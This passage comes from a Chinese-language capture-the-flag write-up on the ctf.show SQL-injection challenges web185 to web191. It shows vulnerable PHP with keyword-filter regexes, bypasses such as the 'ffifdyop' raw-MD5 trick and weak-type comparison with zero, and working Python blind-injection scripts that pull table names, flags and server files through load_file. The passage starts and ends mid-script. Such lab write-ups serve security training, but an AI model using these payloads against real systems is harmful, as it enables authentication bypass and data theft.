<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a65c7280-632a-4429-a6a9-a8250b2e223b.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass regexp(char(&#123;&#125;))&quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;$user_count = 43;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">num: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;+&#x27;</span>.join(<span class="string">&quot;true&quot;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">has: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> payload.<span class="built_in">format</span>(<span class="string">&#x27;,&#x27;</span>.join([convert(<span class="built_in">ord</span>(x)) <span class="keyword">for</span> x <span class="keyword">in</span> has]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;tableName&quot;</span>: p</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> true_flag <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctf&quot;</span> <span class="comment"># 这里注意表中用 regexp(&#x27;ctf&#x27;) 只有一个结果，要提前给出这一小段 flag 头避免其他记录干扰匹配</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;&#123;&#125;-&quot;</span> + string.digits + string.ascii_lowercase:</span><br><span class="line">        pd = flag+c</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r[*] trying <span class="subst">&#123;pd&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> valid_payload(make_payload(pd)):</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>脚本输出 flag。</p>
<h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><p>有过滤的表名位置注入    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line"><span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>过滤增加了几个运算符号，加号还是能用，上一题的脚本一把梭。</p>
<h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>MD5 编码后的字符型注入    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = &#x27;<span class="subst">$username</span>&#x27; and password= &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin可以获得flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不存在&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>username 只能为 admin，password 使用的 md5 函数第二个参数为 true，可用特殊 payload <code>ffifdyop</code> 绕过。    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&quot;ffifdyop&quot;</span>, <span class="literal">true</span>));</span><br><span class="line"><span class="comment">//string(16) &quot;&#x27;or&#x27;6]!r,b&quot;</span></span><br></pre></td></tr></table></figure>
<p>登录成功查看 response 找到 flag。    </p>
<h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>有过滤的数字型注入    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查询语句</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//返回逻辑</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v">Why SELECT * FROM Table where username = 0 shows all rows? [username column is varchar]</a><br>当列的类型为 string 时，在查询限制条件中使用数字会将字符串转为数字进行比较，非数字开头的字符串会被转化为数字 0    </p>
</blockquote>
<p>故这里的 username 填写数字 0 就能查出所有记录。    </p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mrsm1th/p/6745532.html">php弱类型总结</a><br>在 php 中，当一个字符串当作一个数值来取值，其结果和类型如下: 如果该字符串没有包含 ‘.’，’e’，’E’ 并且其数值值在整形的范围之内该字符串被当作 int 来取值，其他所有情况下都被作为 float 来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。    </p>
</blockquote>
<p><code>$row[&#39;pass&#39;]</code> 为 string 类型，若第一个字符不是数字就会被转换为数字 0。尝试在 password 填写数字 0，成功绕过。<br>登录成功，response 内找到 flag。    </p>
<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的数字型注入，尝试上一题的解法不能绕过，password 不止第一个字符是数字，不能被转换为 0。<br>正则很多东西没有过滤，可以利用 username 筛选条件 0 和 1 的回显不同，读文件布尔盲注 flag    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://06d6c1a8-d2cf-4590-8b20-19fd83835dff.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">payload1 = <span class="string">&quot;if(locate(&#x27;ctfshow&#x27;,load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;index&#125;,0,1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag_index</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    end = <span class="number">1000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload1.<span class="built_in">format</span>(index=p),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">return</span> end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] finding flag index&quot;</span>)</span><br><span class="line">flag_index = find_flag_index()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[!] flag index found: <span class="subst">&#123;flag_index&#125;</span>&quot;</span>)</span><br><span class="line">flag = <span class="string">&quot;c&quot;</span></span><br><span class="line">flag_index += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] start to injection&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&quot;if(ascii(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,0,1)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag[-<span class="number">1</span>] != <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload2.<span class="built_in">format</span>(flag_index, p),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    flag += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    flag_index += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>路径 <code>/var/www/html</code> 有点脑洞，题目描述只说了 “flag 在 api/index.php 文件中”<br>脚本输出 flag。    </p>
<h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，没有给出过滤的正则表达式，在 username 处构造 payload 布尔盲注。<br>先查表名，再查列名，再用列名和表名构造 payload 查 flag。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e542cd49-fc4e-4ed0-a6cf-0ba1142d8c97.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_fl0g,ctfshow_user</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># 列名 id,f1ag,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or if(ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(index, p),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> true_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，给出了过滤正则表达式，发现禁用了 ascii，把脚本改成不用二分法而是暴力遍历每个字符的值。<br>（PS：事后发现不用 ascii 也可以直接用大于号比较字母的 ascii 大小，二分法还是能用的……）    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不用二分法</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c9b03201-bcdf-42ce-ac5b-c546603c1848.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where &quot;</span> \</span><br><span class="line">          <span class="string">&quot;table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_char</span>(<span class="params">index: <span class="built_in">int</span>, c: <span class="built_in">chr</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(index, c),</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> true_flag <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span 